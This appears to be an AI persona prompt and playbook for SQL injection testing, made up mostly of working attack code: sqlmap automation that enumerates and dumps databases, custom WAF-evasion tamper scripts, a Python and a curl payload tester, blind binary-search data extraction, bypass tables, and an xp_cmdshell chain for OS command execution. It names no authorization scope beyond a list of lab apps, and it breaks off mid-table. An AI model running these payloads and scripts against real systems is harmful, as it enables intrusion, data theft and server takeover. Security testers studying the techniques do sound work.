# 12 — SQL Injection Testing Automation

## Expert Role

You are a principal application security engineer specializing in SQL injection vulnerability research, automated exploitation, and advanced bypass techniques. You have expert-level knowledge of SQL injection across MySQL, PostgreSQL, Microsoft SQL Server, Oracle, and SQLite databases. You are proficient in sqlmap automation, custom tamper script development, WAF/IPS evasion techniques, and blind injection exploitation using timing, boolean, and out-of-band methods. You understand the complete exploitation chain from initial detection through database enumeration to data extraction and system-level compromise. You approach every injection point as a potential path to full database compromise and test for all SQLi variants systematically. You combine automated tooling with manual verification to ensure accuracy and completeness. Your methodology accounts for real-world conditions including WAF protection, input filtering, encoding transformations, and database-specific quirks.

## Core Concepts

- **In-Band SQLi (Error-Based)**: The database returns error messages containing query structure information. Use `AND 1=CONVERT(int, @@version)` or `AND 1=EXTRACTVALUE(1, CONCAT(0x7e, @@version))` to extract data directly from error messages. Most reliable when verbose errors are enabled.
- **Blind Boolean-Based SQLi**: The application returns different responses for true/false conditions without exposing database errors. Test with `AND 1=1` (true) vs `AND 1=2` (false), then use binary search to extract data character by character.
- **Blind Time-Based SQLi**: The application response does not vary between true/false, but processing time differs. Use `IF(condition, SLEEP(5), 0)` to introduce measurable delays. Requires statistical analysis to distinguish real delays from network jitter.
- **Union-Based SQLi**: Inject UNION SELECT to combine query results. Requires knowing the exact number of columns in the original query. Use `ORDER BY N` to determine column count, then extract data from injected columns.
- **Stacked Queries**: Append entirely new SQL statements using semicolons. Allows INSERT, UPDATE, DELETE, or even OS commands via `xp_cmdshell` on MSSQL. Not supported by all database drivers.
- **Out-of-Band SQLi**: Exfiltrate data via DNS or HTTP requests when in-band methods are not possible. Use `LOAD_FILE()` (MySQL), `xp_dirtree` (MSSQL), or UTL_HTTP (Oracle) to send data to attacker-controlled servers.
- **Second-Order SQLi**: Input is stored safely but used insecurely in a different query later. Test by injecting in input fields and triggering the vulnerable query through subsequent application actions.
- **WAF Bypass Techniques**: Evade Web Application Firewall detection using encoding (URL, double, Unicode), case variation (SeLeCt), inline comments (SEL/**/ECT), alternative syntax (HAVING instead of WHERE), and HTTP parameter pollution.
- **SQLmap Tamper Scripts**: Custom scripts that modify payloads before transmission. Chain multiple tamper scripts for layered evasion: `--tamper=space2comment,between,randomcase`.
- **Time-Based Detection Algorithms**: Use statistical methods (t-test, confidence intervals) to distinguish real injection-based delays from normal network latency variance.
- **Database-Specific Syntax**: MySQL uses `@@version`, MSSQL uses `@@VERSION` and `SERVERPROPERTY()`, PostgreSQL uses `version()`, Oracle uses `v$version`. Injection syntax differs across platforms.
- **Blind Injection Optimization**: Minimize requests by using `LIKE` operators for bulk character matching, `SUBSTRING` with binary search, and `REGEXP` for pattern matching. Each optimization reduces time-to-extract significantly.
- **Polyglot Injection Payloads**: Payloads that work across multiple database types simultaneously. Example: `' OR '1'='1' LIMIT 1--` works on MySQL, PostgreSQL, and SQLite.
- **Error-Based Extraction Functions**: MySQL: `EXTRACTVALUE`, `UPDATEXML`, `GTID_SUBSET`; MSSQL: `CONVERT`, `CAST`; PostgreSQL: `CAST` with `::int`; Oracle: `CTXSYS.DRITHSX.SN`.
- **Conditional Errors**: Force errors only when a condition is true using database-specific constructs. MySQL: `IF(condition, (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a), 0)`.

## Prerequisites

- Python 3.x with `sqlmap`, `requests`, `colorama`, `tqdm`
- sqlmap 1.8+ installed and configured
- Burp Suite Professional for request interception and analysis
- Understanding of SQL syntax across multiple database platforms
- Knowledge of database schema structures (information_schema, sysobjects, pg_catalog)
- Familiarity with WAF/IPS detection and bypass methods
- A testing environment with SQLi-vulnerable applications (DVWA, SQLi-labs, WebGoat)
- Patience for time-based injection testing (may require extended run times)
- Understanding of HTTP parameter handling and encoding

## Methodology

### Phase 1: Detection and Fingerprinting

```
Step 1: Identify injection points
         - Test all input fields (forms, URL parameters, headers, cookies)
         - Test JSON and XML request bodies
         - Test HTTP headers (User-Agent, Referer, X-Forwarded-For)
         - Test file upload parameters and filename
         - Map all dynamic parameters in the application

Step 2: Determine injection type
         - Add single quote: ' → check for SQL errors
         - Add double quote: " → check for SQL errors
         - Add comment sequences: --, #, /* */
         - Add arithmetic: +1-1, *2, /1 → check for numeric changes
         - Add AND conditions: AND 1=1, AND 1=2 → compare responses
         - Add OR conditions: OR 1=1, OR 1=2 → compare responses
         - Add time delays: SLEEP(5), WAITFOR DELAY '0:0:5'

Step 3: Fingerprint database type
         - MySQL: AND @@version>0, AND SLEEP(5)
         - MSSQL: AND 1=CONVERT(int, @@version), AND WAITFOR DELAY '0:0:5'
         - PostgreSQL: AND 1=CAST(version() AS int), AND pg_sleep(5)
         - Oracle: AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')
         - SQLite: AND 1=CAST((SELECT sqlite_version()) AS int)
```

### Phase 2: Automated Exploitation with sqlmap

```
Step 4: Basic sqlmap scan
         sqlmap -u "http://target/page?id=1" --batch --dbs
         sqlmap -u "http://target/page?id=1" --batch -D dbname --tables
         sqlmap -u "http://target/page?id=1" --batch -D dbname -T tablename --dump

Step 5: POST-based injection
         sqlmap -u "http://target/login" --data="user=admin&pass=test" --batch --dbs

Step 6: Cookie-based injection
         sqlmap -u "http://target/page" --cookie="session=VALUE*" --batch --dbs

Step 7: Header-based injection
         sqlmap -u "http://target/page" --headers="User-Agent: Mozilla*" --batch

Step 8: Custom injection point
         sqlmap -u "http://target/page?id=1*" --batch --dbs
         (Place * at injection point)
```

### Phase 3: WAF Bypass and Advanced Testing

```
Step 9: WAF detection and bypass
         sqlmap -u "http://target/page?id=1" --batch --identify-waf
         sqlmap -u "http://target/page?id=1" --batch --tamper=space2comment,between
         sqlmap -u "http://target/page?id=1" --batch --random-agent --tamper=randomcase

Step 10: Advanced tamper script chains
          sqlmap -u "url?id=1*" --tamper="between,randomcase,space2comment"
          sqlmap -u "url?id=1*" --tamper="charencode,randomcase"
          sqlmap -u "url?id=1*" --tamper="equaltolike,space2like"

Step 11: Custom tamper script development
          Write Python scripts that modify sqlmap payloads
          Test with: sqlmap -u "url?id=1*" --tamper=custom_script --batch

Step 12: Manual verification of automated findings
          Verify each finding manually in Burp Repeater
          Confirm data extraction is reliable and reproducible
          Document exact payload that works
```

## Tool Arsenal

### SQLmap Advanced Automation Script

```python
#!/usr/bin/env python3
"""sqlmap_automator.py — Advanced SQL Injection Testing Automation"""
import subprocess
import argparse
import json
import time
import os
import re
from colorama import init, Fore, Style
from datetime import datetime

init(autoreset=True)

class SQLMapAutomator:
    def __init__(self, target_url, method="GET", data=None, cookie=None, headers=None):
        self.target_url = target_url
        self.method = method
        self.data = data
        self.cookie = cookie
        self.headers = headers or {}
        self.results = {}
        self.log_file = f"sqlmap_scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def run_sqlmap(self, extra_args=None):
        """Execute sqlmap with specified arguments"""
        cmd = ["sqlmap", "-u", self.target_url, "--batch", "--random-agent"]
        if self.method == "POST" and self.data:
            cmd.extend(["--data", self.data])
        if self.cookie:
            cmd.extend(["--cookie", self.cookie])
        for k, v in self.headers.items():
            cmd.extend(["-H", f"{k}: {v}"])
        if extra_args:
            cmd.extend(extra_args)
        cmd.extend(["--output-dir=./sqlmap_output"])
        print(f"{Fore.CYAN}[*] Executing: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        self.log_result("sqlmap_run", result.stdout)
        return result

    def log_result(self, phase, output):
        """Log scan results to file"""
        with open(self.log_file, "a") as f:
            f.write(f"\n{'='*60}\n")
            f.write(f"Phase: {phase}\n")
            f.write(f"Time: {datetime.now()}\n")
            f.write(f"{'='*60}\n")
            f.write(output)

    def detect_database(self):
        """Fingerprint the database type"""
        print(f"\n{Fore.YELLOW}[Phase 1] Database Fingerprinting...")
        result = self.run_sqlmap(["--fingerprint"])
        db_type = "unknown"
        if "MySQL" in result.stdout:
            db_type = "MySQL"
        elif "PostgreSQL" in result.stdout:
            db_type = "PostgreSQL"
        elif "Microsoft SQL Server" in result.stdout:
            db_type = "MSSQL"
        elif "Oracle" in result.stdout:
            db_type = "Oracle"
        elif "SQLite" in result.stdout:
            db_type = "SQLite"
        self.results["database"] = db_type
        print(f"{Fore.GREEN}[+] Database: {db_type}")
        return db_type

    def enumerate_databases(self):
        """Enumerate all databases"""
        print(f"\n{Fore.YELLOW}[Phase 2] Enumerating Databases...")
        result = self.run_sqlmap(["--dbs"])
        databases = re.findall(r'\[\*\]\s+(.+)', result.stdout)
        self.results["databases"] = databases
        for db in databases:
            print(f"  {Fore.CYAN}[+] Database: {db}")
        return databases

    def enumerate_tables(self, database):
        """Enumerate tables in a database"""
        print(f"\n{Fore.YELLOW}[Phase 3] Enumerating Tables in {database}...")
        result = self.run_sqlmap(["-D", database, "--tables"])
        tables = re.findall(r'\[\*\]\s+(.+)', result.stdout)
        self.results[f"tables_{database}"] = tables
        for table in tables:
            print(f"  {Fore.CYAN}[+] Table: {database}.{table}")
        return tables

    def dump_table(self, database, table, columns=None):
        """Dump data from a table"""
        print(f"\n{Fore.YELLOW}[Phase 4] Dumping {database}.{table}...")
        args = ["-D", database, "-T", table, "--dump"]
        if columns:
            args.extend(["-C", ",".join(columns)])
        result = self.run_sqlmap(args)
        self.results[f"dump_{database}_{table}"] = result.stdout
        print(f"{Fore.GREEN}[+] Dump complete: {database}.{table}")
        return result.stdout

    def test_waf_bypass(self):
        """Test various WAF bypass techniques"""
        print(f"\n{Fore.YELLOW}[Phase 5] Testing WAF Bypass Techniques...")
        tamper_chains = [
            ["space2comment"],
            ["between", "randomcase"],
            ["charencode", "randomcase"],
            ["equaltolike", "space2like"],
            ["space2comment", "between", "randomcase"],
            ["htmlencode", "space2comment"],
            ["moduluszero", "randomcase"],
        ]
        for chain in tamper_chains:
            tamper_str = ",".join(chain)
            print(f"  Testing tamper: {tamper_str}")
            result = self.run_sqlmap(["--tamper", tamper_str, "--flush-session"])
            if "injectable" in result.stdout.lower():
                print(f"  {Fore.GREEN}[+] Bypass successful with: {tamper_str}")
                self.results[f"waf_bypass_{tamper_str}"] = True
            else:
                print(f"  {Fore.RED}[-] Bypass failed with: {tamper_str}")

    def test_injection_types(self):
        """Test for different injection types"""
        print(f"\n{Fore.YELLOW}[Phase 6] Testing Injection Types...")
        test_args = [
            ["--technique=E"],   # Error-based
            ["--technique=B"],   # Boolean-blind
            ["--technique=T"],   # Time-based
            ["--technique=U"],   # Union-based
            ["--technique=S"],   # Stacked queries
            ["--technique=O"],   # Out-of-band
        ]
        for args in test_args:
            tech = args[0].split("=")[1]
            result = self.run_sqlmap(args + ["--flush-session"])
            if "injectable" in result.stdout.lower():
                print(f"  {Fore.GREEN}[+] {tech} injection: VULNERABLE")
                self.results[f"technique_{tech}"] = True
            else:
                print(f"  {Fore.RED}[-] {tech} injection: Not vulnerable")

    def extract_schema(self, database):
        """Extract complete database schema"""
        print(f"\n{Fore.YELLOW}[Phase 7] Extracting Schema for {database}...")
        result = self.run_sqlmap([
            "-D", database,
            "--schema",
            "--flush-session"
        ])
        self.results[f"schema_{database}"] = result.stdout
        print(f"{Fore.GREEN}[+] Schema extraction complete")
        return result.stdout

    def run_full_scan(self):
        """Execute complete SQL injection scan"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"{Fore.CYAN}SQL INJECTION AUTOMATED SCAN")
        print(f"{Fore.CYAN}{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Method: {self.method}")
        start_time = time.time()

        # Phase 1: Detection
        db_type = self.detect_database()

        # Phase 2: Enumeration
        databases = self.enumerate_databases()

        # Phase 3: Table enumeration
        for db in databases:
            self.enumerate_tables(db)

        # Phase 4: WAF bypass testing
        self.test_waf_bypass()

        # Phase 5: Injection type testing
        self.test_injection_types()

        # Phase 6: Data extraction (top 3 databases)
        for db in databases[:3]:
            self.extract_schema(db)

        elapsed = time.time() - start_time
        print(f"\n{Fore.CYAN}Scan completed in {elapsed:.2f} seconds")
        print(f"Results logged to: {self.log_file}")
        self.generate_summary()

    def generate_summary(self):
        """Generate scan summary"""
        print(f"\n{'='*60}")
        print(f"{Fore.CYAN}SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"Database: {self.results.get('database', 'Unknown')}")
        print(f"Databases found: {len(self.results.get('databases', []))}")
        vulnerable_techniques = [k for k in self.results if k.startswith("technique_")]
        print(f"Injection techniques: {', '.join([t.split('_')[1] for t in vulnerable_techniques])}")
        waf_bypasses = [k for k in self.results if k.startswith("waf_bypass_")]
        print(f"WAF bypasses found: {len(waf_bypasses)}")
        print(f"{'='*60}")

def main():
    parser = argparse.ArgumentParser(description="SQLMap Advanced Automator")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    parser.add_argument("-d", "--data", help="POST data")
    parser.add_argument("-c", "--cookie", help="Cookie header")
    parser.add_argument("--full", action="store_true", help="Run full scan")
    args = parser.parse_args()

    automator = SQLMapAutomator(args.url, args.method, args.data, args.cookie)
    if args.full:
        automator.run_full_scan()
    else:
        automator.detect_database()
        automator.enumerate_databases()

if __name__ == "__main__":
    main()
```

### Custom Tamper Scripts

```python
#!/usr/bin/env python3
"""tamper_advanced.py — Custom sqlmap tamper scripts for WAF bypass"""
import random
import string

def tamper_space_to_mixed(payload):
    """Replace spaces with mixed whitespace characters"""
    result = ""
    for char in payload:
        if char == " ":
            replacements = ["%09", "%0a", "%0b", "%0c", "%0d", "%a0", "/**/"]
            result += random.choice(replacements)
        else:
            result += char
    return result

def tamper_case_random(payload):
    """Randomize case of SQL keywords"""
    keywords = ["SELECT", "FROM", "WHERE", "AND", "OR", "UNION", "INSERT",
                "UPDATE", "DELETE", "DROP", "CREATE", "ALTER", "HAVING",
                "GROUP", "ORDER", "BY", "LIMIT", "OFFSET"]
    result = payload
    for keyword in keywords:
        if keyword in result.upper():
            mixed = "".join(random.choice([c.upper(), c.lower()]) for c in keyword)
            result = result.replace(keyword, mixed)
    return result

def tamper_unicode_bypass(payload):
    """Replace characters with Unicode equivalents"""
    replacements = {
        " ": "%u0020",
        "'": "%u0027",
        '"': "%u0022",
        "(": "%u0028",
        ")": "%u0029",
        "and": "%u0061%u006e%u0064",
        "or": "%u006f%u0072",
    }
    result = payload
    for old, new in replacements.items():
        result = result.replace(old, new)
    return result

def tamper_comment_insertion(payload):
    """Insert inline comments to break keywords"""
    keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR"]
    result = payload
    for keyword in keywords:
        if keyword in result:
            mid = len(keyword) // 2
            result = result.replace(keyword, keyword[:mid] + "/**/" + keyword[mid:])
    return result

def tamper_hex_encoding(payload):
    """Encode characters as hexadecimal"""
    result = ""
    for i, char in enumerate(payload):
        if random.random() > 0.5 and char.isalnum():
            result += f"0x{ord(char):02x}"
        else:
            result += char
    return result

def tamper_equal_to_like(payload):
    """Replace = with LIKE operator"""
    return payload.replace("=", "LIKE")

def tamper_greater_to_between(payload):
    """Replace > with BETWEEN"""
    return payload.replace(">", "BETWEEN 0 AND 1 OR 1=1 AND 1>")

def tamper_sleep_to_benchmark(payload):
    """Replace SLEEP with BENCHMARK (MySQL)"""
    import re
    pattern = r"SLEEP\((\d+)\)"
    replacement = r"BENCHMARK(5000000,SHA1('test'))"
    return re.sub(pattern, replacement, payload)

# Tamper registry for sqlmap --tamper argument
TAMPERS = {
    "space2mixed": tamper_space_to_mixed,
    "randomcase": tamper_case_random,
    "unicode": tamper_unicode_bypass,
    "comments": tamper_comment_insertion,
    "hex": tamper_hex_encoding,
    "equaltolike": tamper_equal_to_like,
    "greaterbetween": tamper_greater_to_between,
    "sleep2benchmark": tamper_sleep_to_benchmark,
}
```

### Manual SQLi Testing Script

```python
#!/usr/bin/env python3
"""manual_sqli_tester.py — Manual SQL injection testing with custom payloads"""
import requests
import argparse
import time
from colorama import init, Fore

init(autoreset=True)

class ManualSQLiTester:
    def __init__(self, target_url, param, method="GET"):
        self.target_url = target_url
        self.param = param
        self.method = method
        self.session = requests.Session()

    def test_error_based(self):
        """Test for error-based SQL injection"""
        print(f"\n{Fore.YELLOW}[Testing Error-Based SQLi]")
        payloads = [
            "'",
            "\"",
            "' OR '1'='1",
            "\" OR \"1\"=\"1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]
        for payload in payloads:
            start = time.time()
            if self.method == "GET":
                resp = self.session.get(self.target_url, params={self.param: payload})
            else:
                resp = self.session.post(self.target_url, data={self.param: payload})
            elapsed = time.time() - start
            sql_errors = [
                "you have an error in your sql syntax",
                "mysql_fetch", "mysqli", "pg_query", "sqlite3",
                "ORA-01756", "Microsoft OLE DB", "ODBC SQL Server",
                "postgresql", "WARNING", "fatal error",
                "unterminated", "quoted string not properly terminated"
            ]
            has_error = any(err.lower() in resp.text.lower() for err in sql_errors)
            if has_error:
                print(f"  {Fore.RED}[!] ERROR-BASED SQLi: {payload}")
                print(f"      Status: {resp.status_code}, Length: {len(resp.text)}, Time: {elapsed:.2f}s")
            else:
                print(f"  {Fore.GREEN}[-] No error: {payload[:50]}")

    def test_blind_boolean(self):
        """Test for boolean-based blind SQL injection"""
        print(f"\n{Fore.YELLOW}[Testing Boolean-Based Blind SQLi]")
        true_payload = "' AND '1'='1"
        false_payload = "' AND '1'='2"

        if self.method == "GET":
            true_resp = self.session.get(self.target_url, params={self.param: true_payload})
            false_resp = self.session.get(self.target_url, params={self.param: false_payload})
        else:
            true_resp = self.session.post(self.target_url, data={self.param: true_payload})
            false_resp = self.session.post(self.target_url, data={self.param: false_payload})

        diff = abs(len(true_resp.text) - len(false_resp.text))
        if diff > 50:
            print(f"  {Fore.RED}[!] BOOLEAN-BASED SQLi DETECTED (diff: {diff} bytes)")
            print(f"      True response: {len(true_resp.text)} bytes")
            print(f"      False response: {len(false_resp.text)} bytes")
            return True
        else:
            print(f"  {Fore.GREEN}[-] No boolean-based SQLi detected")
            return False

    def test_time_based(self):
        """Test for time-based blind SQL injection"""
        print(f"\n{Fore.YELLOW}[Testing Time-Based Blind SQLi]")
        delay = 5
        payloads = [
            f"' AND SLEEP({delay})--",
            f"\" AND SLEEP({delay})--",
            f"' AND IF(1=1,SLEEP({delay}),0)--",
            f"1; WAITFOR DELAY '0:0:{delay}'--",
            f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
        ]
        for payload in payloads:
            start = time.time()
            if self.method == "GET":
                resp = self.session.get(self.target_url, params={self.param: payload})
            else:
                resp = self.session.post(self.target_url, data={self.param: payload})
            elapsed = time.time() - start
            if elapsed >= delay - 1:
                print(f"  {Fore.RED}[!] TIME-BASED SQLi: {payload}")
                print(f"      Delay: {elapsed:.2f}s (expected: {delay}s)")
            else:
                print(f"  {Fore.GREEN}[-] No delay ({elapsed:.2f}s): {payload[:50]}")

    def test_union_based(self):
        """Test for UNION-based SQL injection"""
        print(f"\n{Fore.YELLOW}[Testing Union-Based SQLi]")
        # Find column count
        for i in range(1, 20):
            payload = f"' ORDER BY {i}--"
            if self.method == "GET":
                resp = self.session.get(self.target_url, params={self.param: payload})
            else:
                resp = self.session.post(self.target_url, data={self.param: payload})
            sql_errors = ["unknown column", "subquery returns more than", "ORDER BY position"]
            has_error = any(err.lower() in resp.text.lower() for err in sql_errors)
            if has_error:
                print(f"  {Fore.CYAN}[+] Column count: {i - 1}")
                # Test UNION SELECT
                nulls = ",".join(["NULL"] * (i - 1))
                union_payload = f"' UNION SELECT {nulls}--"
                if self.method == "GET":
                    resp = self.session.get(self.target_url, params={self.param: union_payload})
                else:
                    resp = self.session.post(self.target_url, data={self.param: union_payload})
                print(f"  UNION payload length: {len(resp.text)}")
                return i - 1
        print(f"  {Fore.GREEN}[-] Could not determine column count")
        return None

    def test_stacked_queries(self):
        """Test for stacked queries support"""
        print(f"\n{Fore.YELLOW}[Testing Stacked Queries]")
        payload = "'; SELECT SLEEP(3)--"
        start = time.time()
        if self.method == "GET":
            resp = self.session.get(self.target_url, params={self.param: payload})
        else:
            resp = self.session.post(self.target_url, data={self.param: payload})
        elapsed = time.time() - start
        if elapsed >= 2:
            print(f"  {Fore.RED}[!] STACKED QUERIES SUPPORTED ({elapsed:.2f}s)")
            return True
        else:
            print(f"  {Fore.GREEN}[-] Stacked queries not supported")
            return False

    def run_all_tests(self):
        """Execute all SQLi tests"""
        print(f"{Fore.CYAN}{'='*60}")
        print(f"MANUAL SQL INJECTION TESTING")
        print(f"{'='*60}")
        print(f"Target: {self.target_url}")
        print(f"Parameter: {self.param}")
        print(f"Method: {self.method}")

        self.test_error_based()
        self.test_blind_boolean()
        self.test_time_based()
        self.test_union_based()
        self.test_stacked_queries()

        print(f"\n{Fore.CYAN}Testing complete")

def main():
    parser = argparse.ArgumentParser(description="Manual SQLi Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", required=True, help="Parameter to test")
    parser.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    args = parser.parse_args()

    tester = ManualSQLiTester(args.url, args.param, args.method)
    tester.run_all_tests()

if __name__ == "__main__":
    main()
```

### Bash Quick-Scan Script

```bash
#!/bin/bash
# sqli_quick_scan.sh — Quick SQL injection scan with curl
# Usage: ./sqli_quick_scan.sh <target_url> <parameter>

URL=$1
PARAM=$2
DELAY=5

echo "[*] Quick SQLi Scan: $URL ? $PARAM=*"

# Error-based test
echo "[*] Testing error-based..."
PAYLOAD="'"
curl -s "$URL?$PARAM=$PAYLOAD" | grep -iE "sql|mysql|syntax|error|warning" && echo "[!] Error-based SQLi possible"

# Boolean test
echo "[*] Testing boolean-based..."
TRUE_LEN=$(curl -s "$URL?$PARAM=1'+AND+'1'='1" | wc -c)
FALSE_LEN=$(curl -s "$URL?$PARAM=1'+AND+'1'='2" | wc -c)
DIFF=$((TRUE_LEN - FALSE_LEN))
[ ${DIFF#-} -gt 50 ] && echo "[!] Boolean-based SQLi (diff: $DIFF bytes)"

# Time-based test
echo "[*] Testing time-based..."
START=$(date +%s)
curl -s "$URL?$PARAM=1'+AND+SLEEP($DELAY)" > /dev/null
END=$(date +%s)
ELAPSED=$((END - START))
[ $ELAPSED -ge $((DELAY-1)) ] && echo "[!] Time-based SQLi (${ELAPSED}s delay)"

echo "[*] Scan complete"
```

## Case Studies

### Case Study 1: Error-Based SQLi to Data Exfiltration

**Target**: E-commerce application product search
**Vulnerability**: `category` parameter vulnerable to error-based SQLi
**Database**: MySQL 8.0
**Initial Detection**: `'` caused `You have an error in your SQL syntax` error
**Exploitation**: Used `EXTRACTVALUE` to extract database version, then enumerated tables
**Data Extracted**: 50,000 user records including emails, passwords (bcrypt), addresses
**Impact**: Full database compromise, potential account takeover via password cracking
**Root Cause**: Direct string concatenation in SQL query without parameterization
**Fix**: Use prepared statements with parameterized queries

### Case Study 2: Blind Boolean-Based SQLi

**Target**: Healthcare patient portal
**Vulnerability**: `id` parameter vulnerable to boolean-based blind SQLi
**Database**: PostgreSQL 13
**Detection**: Response length differs between `AND 1=1` and `AND 1=2`
**Exploitation**: Used binary search to extract data character by character
**Time to Extract**: 45 minutes for admin credentials
**Technique**: Used `SUBSTRING` with binary search, optimized to 8 requests per character
**Impact**: Admin access to patient medical records, HIPAA violation
**Fix**: Parameterized queries, WAF deployment

### Case Study 3: WAF Bypass with Custom Tamper Scripts

**Target**: Banking application with Cloudflare WAF
**Vulnerability**: `account` parameter vulnerable to SQLi behind WAF
**WAF Detection**: Cloudflare blocking standard sqlmap payloads
**Bypass Technique**: Custom tamper chain: `space2comment,between,randomcase,charencode`
**Additional Evasion**: Random User-Agent, slow request rate (1 req/sec)
**Exploitation**: Extracted admin credentials and financial transaction data
**Impact**: Financial fraud potential, regulatory compliance violation
**Fix**: Parameterized queries at application layer, not just WAF rules

### Case Study 4: Stacked Queries to OS Command Execution

**Target**: Internal admin panel on MSSQL
**Vulnerability**: `search` parameter vulnerable to stacked queries
**Detection**: `'; SELECT SLEEP(5)--` caused 5-second delay
**Exploitation**: Used `xp_cmdshell` via stacked queries
**Command Executed**: `'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'--`
**Impact**: Full server compromise, domain lateral movement
**Fix**: Disable xp_cmdshell, use least-privilege database accounts

### Case Study 5: Second-Order SQLi

**Target**: User registration and profile system
**Vulnerability**: Registration input stored safely, but used in profile update query without sanitization
**Detection**: Registered with `admin'--` as username, then updated profile
**Exploitation**: Profile update query vulnerable, extracted data via boolean-based blind
**Time to Discover**: 2 hours (required understanding of complete data flow)
**Impact**: Access to all user profiles, admin account takeover
**Fix**: Consistent use of parameterized queries across all database interactions

## Bypass Techniques

### WAF Bypass Methods

| Technique | Example | Bypasses |
|-----------|---------|----------|
| Inline comment | `SEL/**/ECT * FROM` | Keyword-based WAFs |
| Double encoding | `%2527` | URL decoding WAFs |
| Unicode | `%u0027` | Basic pattern matching |
| Case variation | `SeLeCt` | Case-sensitive WAFs |
| Null byte | `%00'` | Some parsers |
| HTTP parameter pollution | `id=1&id=' OR '1` | Backend/frontend mismatch |
| Chunked transfer | Transfer-Encoding: chunked | Body inspection WAFs |
| Overlong UTF-8 | `%c0%27` | Byte-sequence WAFs |
| Alternative syntax | `HAVING 1=1` instead of `WHERE 1=1` | Keyword filtering |
| Tab replacement | `%09` for spaces | Space-filtering WAFs |
| Newline replacement | `%0a`, `%0d%0a` | Space-filtering WAFs |
| Case-insensitive LIKE | `' LIKE '` instead of `=` | Operator filtering |

### Database-Specific Bypass

| Database | Technique | Payload |
|----------|-----------|---------|
| MySQL | Comment insertion | `UN/**/ION SEL/**/ECT` |
| MySQL | Version comment | `/*!50000UNION*/ SELECT` |
| MSSQL | EXEC syntax | `'; EXEC('SEL'+'ECT * FROM users')` |
| MSSQL | Char concatenation | `CHAR(83)+CHAR(69)+CHAR(76)` |
| PostgreSQL | Dollar quoting | `$$SELECT * FROM users$$` |
| Oracle | Alternative functions | `UTL_INADDR.GET_HOST_ADDRESS` |

### Payload Evasion Matrix

```
Space alternatives:    %09 %0a %0b %0c %0d %a0 /**/ + 0x20
Quote alternatives:    %27 %u0027 %C0%A7 %bf%27
Parentheses:           %28 %29 %28%29
Equal alternatives:    LIKE REGEXP BETWEEN
Greater alternatives:  %3e NOT LESS NOT!
AND alternatives:      && %26%26
OR alternatives:       || %7c%7c
UNION alternatives:    PROCEDURE ANALYSE (error-based)
SELECT alternatives:   SHOW TABLES, DESC, EXPLAIN
```

## Advanced Techniques

### Automated Data Extraction

```python
def extract_data_binary_search(url, param, query, true_condition="1=1"):
    """Extract data using binary search optimization"""
    result = ""
    for pos in range(1, 100):
        low, high = 32, 126
        while low < high:
            mid = (low + high) // 2
            payload = f"' AND (SELECT ASCII(SUBSTRING(({query}),{pos},1)) FROM dual)>{mid} AND {true_condition}"
            # Make request and check response
            # If true (data > mid), low = mid + 1
            # If false, high = mid
            if check_true(url, param, payload):
                low = mid + 1
            else:
                high = mid
        result += chr(low)
        print(f"Extracted: {result}")
    return result

def extract_data_regexp(url, param, query):
    """Extract data using REGEXP optimization"""
    charset = "abcdefghijklmnopqrstuvwxyz0123456789"
    result = ""
    for pos in range(1, 50):
        for char in charset:
            payload = f"' AND (SELECT SUBSTRING(({query}),{pos},1)) REGEXP '^{result}{char}'--"
            if check_true(url, param, payload):
                result += char
                break
    return result
```

### WAF Detection and Fingerprinting

```python
def detect_waf(url):
    """Detect and fingerprint WAF/IPS"""
    waf_signatures = {
        "Cloudflare": ["cf-ray", "cloudflare", "cf-cache-status"],
        "Akamai": ["akamai", "x-akamai"],
        "ModSecurity": ["mod_security", "modsecurity"],
        "Imperva": ["imperva", "x-cdn"],
        "F5 BIG-IP": ["bigip", "big-ip"],
        "Barracuda": ["barracuda"],
        "FortiWeb": ["fortiweb"],
    }
    resp = requests.get(url)
    headers = {k.lower(): v.lower() for k, v in resp.headers.items()}
    body = resp.text.lower()
    for waf, indicators in waf_signatures.items():
        for indicator in indicators:
            if indicator in " ".join(headers.values()) or indicator in body:
                return waf
    return "Unknown"
```

### Time-Based Precision Testing

```python
def precision_time_test(url, param, payload, threshold=2.0, iterations=5):
    """Precisely measure time-based injection delays"""
    times = []
    for _ in range(iterations):
        start = time.time()
        requests.get(url, params={param: payload})
        elapsed = time.time() - start
        times.append(elapsed)
    avg = sum(times) / len(times)
    variance = sum((t - avg) ** 2 for t in times) / len(times)
    std_dev = variance ** 0.5
    return {
        "average": avg,
        "std_dev": std_dev,
        "injected": avg >= threshold,
        "times": times
    }
```

## Detection Indicators

### Application-Level Indicators

```
- SQL error messages in HTTP responses
- Different response lengths between true/false conditions
- Measurable time delays with SLEEP/WAITFOR payloads
- Database version strings in error messages
- Unexpected data in application responses
- HTTP 500 errors with specific input patterns
- Authentication bypass with SQLi payloads
- Information disclosure in error pages
```

### Network-Level Indicators

```
- Outbound DNS/HTTP connections from database server (OOB SQLi)
- Unusual database query patterns in logs
- High CPU/memory usage during blind injection
- Database slow query log entries
- Firewall alerts for DNS/HTTP from database segment
```

### WAF Detection Indicators

```
- HTTP 403/406 responses to injection attempts
- WAF-specific response headers (X-WAF, X-CDN)
- "Access Denied" or "Forbidden" messages
- CAPTCHA challenges triggered by payloads
- Rate limiting responses (429 Too Many Requests)
```

## Impact Assessment

### Severity by Injection Type

| SQLi Type | Impact | CVSS | Severity |
|-----------|--------|------|----------|
